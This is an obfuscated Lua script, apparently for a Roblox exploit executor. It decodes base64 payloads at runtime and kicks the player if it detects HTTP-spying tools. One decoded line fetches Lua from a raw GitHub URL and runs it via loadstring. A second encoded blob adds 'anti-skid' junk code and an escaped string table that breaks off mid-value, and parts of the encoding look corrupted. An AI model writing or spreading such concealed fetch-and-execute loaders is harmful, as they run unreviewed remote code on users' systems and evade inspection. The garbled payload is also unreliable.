local c=require;local d=game;local e=Instance;local f=getfenv or function()return _ENV end
local function g(x)local y='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'x=string.gsub(x,'[^'..y..'=]','')return(x:gsub('.',function(z)if(z=='=')then return''end local A,B='',(y:find(z)-1)for i=6,1,-1 do A=A..(B%2^i - B%2^(i-1) >0 and'1'or'0')end return A end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(w)if(#w~=8)then return''end local C=0 for i=1,8 do C=C+(w:sub(i,i)=='1' and 2^(8-i) or 0)end return string.char(C)end))end

local function h()d.Players.LocalPlayer:Kick(string.char(68,101,111,98,102,117,115,99,97,116,105,110,103,32,115,99,114,105,112,116,115,32,116,104,97,116,32,97,114,101,110,116,32,121,111,117,114,115,32,99,97,110,32,103,101,116,32,121,111,117,32,105,110,32,116,114,111,117,98,108,101,44,32,121,111,117,32,107,110,111,119,32,116,104,97,116,32,114,105,103,104,116,63,32,45,104,101,115,103,111,108,100))

local function i()
    local j=rawget
    if j(_G,'httpsSpy')or j(_G,'HttpsSpy')or j(_G,'httpSpy')then return true end
    if debug and debug.getupvalue then
        for k=1,50 do
            local l=debug.getupvalue(k)
            if l and tostring(l):lower():find(string.char(104,116,116,112,115,112,121)) then return true end
        end
    end
    return false
end

local m="bG9hZHN0cmluZyhnYW1lOkh0dHBDZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CZWJvLU1vZHMvU2NyaXB0cy9yZWZzL2hlYWRzL21hc3Rlci9IdHRwc1NweS5sdWEiKClmKCk="
loadstring(g(m))()

if i()then h()end

loadstring(g("CmxvY2FsIFNLSURfVFJBUCA9IHt9CmZvciBpID0gMSwgMTAwMCBkbwogICAgU0tJRF9UUkFQWyJGIiAuLiB0b3N0cmluZyhtYXRoLnJhbmRvbSgxMDAwMDAsOTk5OTk5KSldID0gZnVuY3Rpb24oKQogICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoe30sIHtfX2NhbGwgPSBmdW5jdGlvbigpIHJldHVybiBtYXRoLnJhbmRvbSgpLCBlcnJvcigiaY29ycnVwdCBtZW1vcnkgc3RhY2siKSwgMS8wIGVuZH0pCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiB1c2VsZXNzX29iZl9sYXllcih4KQogICAgbG9jYWwgZnVuY3Rpb24gZGVlcF9mYWtlKHkpIHJldHVybiBmdW5jdGlvbigpIHJldHVybiBmdW5jdGlvbigpIHJldHVybiB5IGVuZCBlbmQgZW5kCiAgICByZXR1cm4gZGVlcF9mYWtlKHgpKCkoKSAuLiB0b3N0cmluZyhtYXRoLnJhbmRvbSgpKSAuLiAiX3NraWQiCmVuZAoKX0dbdXNlbGVzc19vYmZfbGF5ZXIoImFudGlza2lkIildID0gdHJ1ZQoKcmV0dXJuKGZ1bmN0aW9uKC4uLilsb2NhbCBZPXsiXDA3M1wwNDdcMDUxXDA1M1wwNjlcMDcwXDEyMlwwNjZcMTEyXDExNVwwODZcMDg0XDA1NlwxMjBcMDYxXDA2MSI7IlwwNjlcMDU0XDExMlwwNzhcMTE3XDExNVwwNjVcMDc4XDEwOFwxMTFcMDYxXDA2MSIsIlwxMDRcMDUxXDEwOFwwNjlcMDk5XDExOFwxMTVcMDg5XDEwOVwwNTJcMDk5XDA1MVwwNzdcMDU0XDA5OFwxMTlcMTA2XDA1NlwxMTdcMTA2XDA1NFwxMDFcMTAwXDA4M1wxMDFcMDc3XDA2MVwwNjEiLCJcMDk5XDA1M1wxMDJcMTE1XDA3OFwwNzdcMDYxXDA2MSIsIlwwNzNcMDk5XDEwMVwwNzVcMTAwXDExNVwxMDNcMTEzXDA1NlwwNzFcMDc2XDExNFwwNTJcMDUzXDExMVwxMTdcMDkwXDA1MVwwNzJcMDYxIjsiXDA4NlwwNDdcMDUyXDExN1wxMDBcMTAzXDExNlwxMTVcMDgwXDA4NlwxMTZcMDc0XDA0OFwwODdcMTE2XDExNyIsIlwwOTBcMDcwXDExN1wwNjlcMTE4XDExNlwxMjBcMTE0XDA4MFwxMTVcMTE2XDA4MVwxMDBcMTAzXDA1NFwwNzJcMDU2XDExM1wwNjFcMDYxIiwiXDA3M1wwOTBcMDkwXDA1N1wwNTdcMDk4XDA2OFwxMTNcMDg4XDEwNlwwODZcMDc3XDA5OVwwNTFcMTE1XDA4M1wwNzZcMDUyXDA3MFwwNTBcMDgwXDExMVwwNjFcMDYxIiwiXDA4NlwwNzBcMTE2XDA3OVwwNTZcMTA1XDA1MlwwNTdcMTE4XDA3MVwwNDhcMDcyXDA4MFwwNzRcMTA5XDA3MSIsIlwwODFcMTE5XDEyMlwwNzlcMTEyXDExNVwwNzNcMDUxXDA5N1wxMjBcMDYxXDA2MSIsIlwxMTBcMDg0XDA2NlwxMDdcMTEzXDA3OVwwODNcMTAwXDEwNVwwNzhcMDk3XDExNFwwNjdcMDc3XDEwNlwxMTFcMTIyXDA4MFwwNjdcMTEzIjsiXDEwM1wwODRcMDU2XDExOVwwODdcMTAzXDA1NlwxMDlcMTE4XDA3MVwwNzFcMTEzXDA3NFwwNDdcMDU0XDEwMiIsIlwwNTRcMTIwXDA4NFwxMTFcMTE2XDEyMFwwNjlcMDYxIjsiXDA3M1wxMjBcMTExXDA0OVwxMQo="))()
